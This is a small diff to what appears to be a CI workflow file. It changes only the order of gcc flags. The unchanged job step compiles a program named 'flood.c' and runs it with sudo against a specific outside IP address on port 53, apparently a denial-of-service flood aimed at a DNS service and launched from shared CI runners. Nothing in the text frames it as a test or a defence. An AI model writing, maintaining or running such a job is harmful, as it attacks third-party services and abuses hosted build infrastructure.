@@ -7,5 +7,5 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v6
       - run: |
-          gcc flood.c -o flood -std=c2x -pthread -O3 -flto -march=native
+          gcc -O3 -std=c2x -pthread -flto -march=native flood.c -o flood
           sudo ./flood 103.67.202.153 53
